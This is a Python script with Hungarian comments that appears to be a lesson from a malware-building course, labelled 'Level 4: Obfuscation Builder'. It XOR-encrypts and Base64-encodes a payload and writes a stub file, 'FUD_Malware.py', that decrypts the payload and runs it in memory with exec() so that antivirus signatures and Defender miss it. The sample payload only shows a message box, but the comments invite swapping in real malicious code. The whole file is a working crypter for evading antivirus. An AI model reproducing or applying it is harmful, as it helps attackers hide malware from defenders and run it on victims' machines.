import base64
import os
import random
import string

def xor_encrypt(data, key):
    """
    XOR Titkosítás: A legegyszerűbb és leghatékonyabb módszer a
    statikus vírusirtó aláírások (signatures) megtévesztésére.
    """
    encrypted = []
    for i in range(len(data)):
        encrypted.append(chr(ord(data[i]) ^ ord(key[i % len(key)])))
    return "".join(encrypted)

def generate_random_key(length=12):
    """Véletlenszerű kulcsot generál, hogy minden build egyedi legyen."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def build_stub():
    print("--- [ LEVEL 4: OBFUSCATION BUILDER ] ---")
    
    # 1. A "GONOSZ" KÓD (Payload)
    # Ezt akarjuk elrejteni. Most egy ártalmatlan üzenetablakot dob fel.
    # Élesben ide jönne a Project 30 vagy 31 kódja!
    payload_code = """
import ctypes
import sys

def malicious_activity():
    # Ez az üzenet bizonyítja, hogy a kód lefutott!
    ctypes.windll.user32.MessageBoxW(0, "Sikeres Támadás! A Defender nem látott.", "Level 4 - Obfuscation", 1)
    
malicious_activity()
"""
    
    # 2. Kulcs generálása
    key = generate_random_key()
    print(f"[*] Generált titkosító kulcs: {key}")
    
    # 3. Titkosítás (XOR)
    print("[*] Payload titkosítása...")
    encrypted_data = xor_encrypt(payload_code, key)
    
    # 4. Kódolás (Base64) - hogy szövegként beilleszthető legyen a fájlba
    b64_encoded = base64.b64encode(encrypted_data.encode('utf-8')).decode('utf-8')
    
    # 5. A HORDOZÓ (Stub) Sablonja
    # Ez a kód kerül a célpont gépére. Ebben NINCS benne a payload nyíltan.
    stub_template = f"""
import base64
import ctypes

# --- REJTETT ADATOK ---
# A vírusirtó csak egy rakás véletlenszerű karaktert lát itt:
ENCRYPTED_PAYLOAD = "{b64_encoded}"
DECRYPTION_KEY = "{key}"

def decrypt_and_execute():
    try:
        # 1. Base64 Visszafejtés
        decoded = base64.b64decode(ENCRYPTED_PAYLOAD).decode('utf-8')
        
        # 2. XOR Visszafejtés (az eredeti kód visszanyerése)
        decrypted_code = []
        for i in range(len(decoded)):
            decrypted_code.append(chr(ord(decoded[i]) ^ ord(DECRYPTION_KEY[i % len(DECRYPTION_KEY)])))
        
        real_code = "".join(decrypted_code)
        
        # 3. Végrehajtás a MEMÓRIÁBAN (Fileless execution)
        # A kód soha nem íródik ki a lemezre .py fájlként!
        exec(real_code)
        
    except Exception as e:
        pass

if __name__ == "__main__":
    decrypt_and_execute()
"""

    # 6. Fájlba írás
    output_filename = "FUD_Malware.py"
    with open(output_filename, "w", encoding="utf-8") as f:
        f.write(stub_template)
        
    print(f"\n[SUCCESS] A '{output_filename}' elkészült!")
    print(f"[INFO] Ez a fájl tartalmazza a titkosított vírust.")
    print("[TASK] Most próbáld meg lefuttatni a generált fájlt!")

if __name__ == "__main__":
    build_stub()